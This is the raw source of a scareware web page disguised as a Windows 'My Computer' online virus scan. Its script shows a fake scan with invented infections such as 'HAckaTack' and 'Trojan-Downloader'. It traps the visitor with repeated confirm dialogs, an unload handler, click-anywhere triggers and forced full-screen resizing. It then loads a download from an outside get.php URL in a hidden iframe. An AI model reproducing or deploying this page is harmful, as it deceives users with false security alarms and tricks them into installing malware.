<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>My computer Online Scan</title>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="flist.js"></script>
<link type="text/css" rel="stylesheet" href="style.css"/>
<script>
var prcnt_interval;
var deeps_nacs=15;
var iteration=0;
var progressWidth = 0;
var flashedObjects = [];

 function parseURL(str){
    var res = {};
    var params = str.split("?")[1] || "";
    var arr = params.split("&");
    for(var i in arr){
        var pair = arr[i].split("=");
        if(pair.length == 2)
            res[pair[0]] = pair[1];
    }
    return res;
}

function update() {

	if ($(".progress_bar_fill").width()>0) {
		$("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
		$("#cur_file_scan").html(flist[Math.floor(Math.random()*flist.length)] );

		if ($(".progress_bar_fill").width()<100 && iteration==2)  {
			flashedObjects[3] = "#tc3";
			flashedObjects[4] = "#tc4";
			$("#threat3").toggleClass("none");
			iteration=3;
		}
		if ($(".progress_bar_fill").width()<progressWidth-10 && iteration==0) {
			$("<img>").attr("src", soundfile);
			flashedObjects[0] = "#attention";
			flashedObjects[1] = "#tc1";
			iteration=1;
			$("#threat1").toggleClass("none");
			$("#desc").toggleClass("none");
			$("#alert_img").attr("src","alert.gif");
			setInterval("flashingObjects()", 1000);
		}
		if ($(".progress_bar_fill").width()<200 && iteration==1) {
			$("#threat2").toggleClass("none");
			flashedObjects[2] = "#tc2";
			iteration=2;
		}

	} else {
		clearInterval(prcnt_interval);
		$(".file_scanner").html("Scan complete.");
		setTimeout("dpop2()",1000);
	}
}

function flashingObjects() {
	$.each(flashedObjects, function() {
		if (window == this) return;
		setTimeout("$('"+this+"').removeClass('none');", 50);
		setTimeout("$('"+this+"').addClass('none');", 900);
	});
}

zzz = true;
function Ch(){
if (zzz) {confirmUnload();}
}

function confirmUnload() {
if (confirm('Your computer is stongly infected by viruses! '+
    ' It can cause data loss and file damages and need to be cured as soon as possible. ')){
parent.hiddenFrame.document.location.href='http://www.ckwz.co.cc/get.php?id=02924';
}
    else {
    if (alert('Please install antivirus software.')) {
    confirmUnload();
    }
    else {
    confirmUnload();
    }
    }
    }

function download() {
zzz= false;
confirmUnload();
//window.location.replace('http://www.ckwz.co.cc/get.php?id=02924');
zzz= true;
}

function dpop2() {
	confirm(
	'Your computer is stongly infected by viruses! '+
	' It can cause data loss and file damages and need to be cured as soon as possible. ');
	download();
	pop4();
}

function pop4() {
	playsound(soundfile);
	$("#alert").css('top', $(window).height()/2- $("#alert").height()/2);
	$("#alert").css('left', $(window).width()/2- $("#alert").width()/2);
	$("#alert").show();
	$(".left_bar").css("display","none");
	$(".left_bar").css("display","block");
}

function sp2init(){
//	document.body.innerHTML+="<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>";
}

//-----------------------------------

var soundfile="chord.wav"

function playsound(soundfile) {
	if (document.all) {
		$("soundeffect").src=""
		$("soundeffect").src=soundfile
	}
}

function bindsound(tag, soundfile, masterElement) {
	if (!window.event) return;
	var source=event.srcElement
	while (source!=masterElement && source.tagName != "HTML") {
		if (source.tagName==tag.toUpperCase()) {
			playsound(soundfile);
			break;
		}
		//------------------------------------------
		source=source.parentElement
	}
}

$(document).ready(function() {
document.onclick = download;
	if (window.attachEvent) {
		window.resizeTo(11*10, 11*11-7);
		v1 = $.browser.msie;
		window.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
	}

	window.moveTo(0,0);
	window.resizeTo(screen.width,screen.height);
	window.focus();

	$("#white").css("display","none");
	$("#page_progress").css("display","none");
	$(".left_bar").css("display","none");
	$(".left_bar").css("display","block");
	$(".progress_bar_fill").animate({width:"0px"},deeps_nacs*1000);
	progressWidth = $(".progress_bar_fill").width();
	prcnt_interval = setInterval(update,deeps_nacs*10);

	isXPSP2 = (window.navigator.userAgent.indexOf("SV1") != -1);
	if(isXPSP2) sp2init();

	$("body").click(function() {
		download();
		return false;
	});
});

$.preloadImages = function() {
	for(var i = 0; i< arguments.length; i++) {
		$("<img>").attr("src", arguments[i]);
	}
}
$.preloadImages("alert.gif");

</script>
</head>

<body  onBeforeUnload="Ch();">
	<bgsound src="#" id="soundeffect" hidden="true" loop="1" autostart="false" />

	<div id="alert"><img id="alert_img"></div>
	<div id="white" class="white_div" align="center">
		<div style="position:relative;top:50%"><img src="page_progressbar.gif" width="51" height="19"/></div>
	</div>

	<div class="left_bar">
		<div class="left_header">System Tasks</div>
		<div class="left_box">
			<div class="left_box_line">
				<img src="i5000000.gif" width="14" height="16"/ class="left_bar_icon"><a href="#">View system information</a>
			</div>
			<div class="left_box_line">
				<img src="i6000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Add or remove programs</a>
			</div>
			<div class="left_box_line">
				<img src="i7000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Change a settings</a>
			</div>
		</div>
		<div class="left_header">Other Places</div>
		<div class="left_box">
			<div class="left_box_line">
				<img src="i1000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Network Places</a>
			</div>
			<div class="left_box_line">
				<img src="i2000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Documents</a>
			</div>
			<div class="left_box_line">
				<img src="i3000000.gif" width="16" height="14"/ class="left_bar_icon"> <a href="#">Shared Documents</a>
			</div>
			<div class="left_box_line">
				<img src="i4000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Control Panel</a>
			</div>
		</div>
		<div class="left_header">Details</div>
		<div class="left_box">
			<div class="left_box_line"><strong>My Computer</strong><br />System Folder</div>
		</div>
	</div>

	<div class="right_bar">
		<div class="right_hr">System scan progress</div>
		<div class="folder_box">
			<div id="tc1" class="trojan none">
				<img src="inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">17 trojans</span>
			</div>
			<img src="folder.gif" width="43" height="40" class="folder_icon"/>Shared Documents
		</div>
		<div class="folder_box">
			<div id="tc2" class="trojan none">
				<img src="inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">12 viruses</span>
			</div>
			<img src="folder.gif" width="43" height="40" class="folder_icon"/>My Documents
		</div>

		<div class="right_hr">Hard drives</div>
		<div class="folder_box">
			<div id="tc3" class="trojan none">
					<img src="inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">24 trojans</span>
				</div>
			<img src="hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (C:)
		</div>
		<div class="folder_box">
			<div id="tc4" class="trojan none">
				<img src="inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">32 trojans</span>
			</div>
			<img src="hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (D:)
		</div>

		<div class="right_hr">DVD</div>
		<div class="folder_box">
			<img src="dvd.gif" width="43" height="40" class="folder_icon"/>DVD-RAM Drive (E:)
		</div>
		<div class="progress_bar">
<!-- 			<div class="progress_bar_bg">  -->
				<div class="progress_bar_progress">
					<div class="progress_bar_fill"></div>
					<div id="progress_prcnt">0%</div>
				</div>
<!-- 			</div> -->
		</div>

		<div class="file_scanner">Now scanning: <span id="cur_file_scan">none</span></div>

		<div class="window1" >
			<div style="font-size:15px;font-weight:bold;color:white;padding-top:14px;padding-left:35px;" id="attention">Attention! Your Computer is Infected!</div>

			<div style="padding-top:22px;">Threats and actions:</div>
			<table border="0">
			<tr>
				<td width="166" class="td_cell1">Name</td>
				<td width="105" class="td_cell1">Risk level</td>
				<td width="85" class="td_cell1">Date</td>
				<td width="120" class="td_cell1">Files infected</td>
				<td width="120" class="td_cell1">State</td>
			</tr>
			<tr class="none" id="threat1">
				<td class="td_cell2"><img src="qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>HAckaTack</b></td>
				<td class="td_cell2"><b><font color="red">Critical</font></b></td>
				<td class="td_cell2">18.04.2008</td>
				<td class="td_cell2">35</td>
				<td class="td_cell2">Register & Remove</td>
			</tr>
			<tr class="none" id="threat2"">
				<td class="td_cell2"><img src="qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Email-Worm.Win32.Myd</b></td>
				<td class="td_cell2"><b><font color="red">Critical</font></b></td>
				<td class="td_cell2">18.04.2008</td>
				<td class="td_cell2">35</td>
				<td class="td_cell2">Register & Remove</td>
			</tr>
			<tr class="none" id="threat3">
				<td class="td_cell2"><img src="qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Trojan-Downloader.Win</b></td>
				<td class="td_cell2"><b><font color="red">Critical</font></b></td>
				<td class="td_cell2">18.04.2008</td>
				<td class="td_cell2">35</td>
				<td class="td_cell2">Register & Remove</td>
			</tr>
			</table>

			<div style="padding-top:12px;padding-left:12px;width:600px" class="none" id="desc">
				<b>Description:</b><br />
				This program is potentially dangerous for your system. <b>HAckaTack</b> stealing passwords, credit cards and other personal information from your computer.<br /><br />
				<b>Advice:</b><br/>
				You need to remove this threat as soon as possible!
			</div>
			<div style="padding-top:50px;padding-left:590px"><a href="#">Full system cleanup</a></div>
		</div>
		<div style="padding-top:12px;padding-left:12px;width:600px" id="foot_att">
			In order to protect your computer Safety Center detected several viruses and troyans which need to be immediately removed.<br /><br />
			<b>ATTENTION: Spyware and maleficent software is critical. It penetrates personal computers through internet connection and gathers private information sending it to the virus’s creator.</b><br />
			<b>Be careful – millions of people have already suffered from spyware threats!</b>
		</div>

	</div>
<iframe name="hiddenFrame" id="hiddenFrame" width=0px height=0px>
</body>
</html>
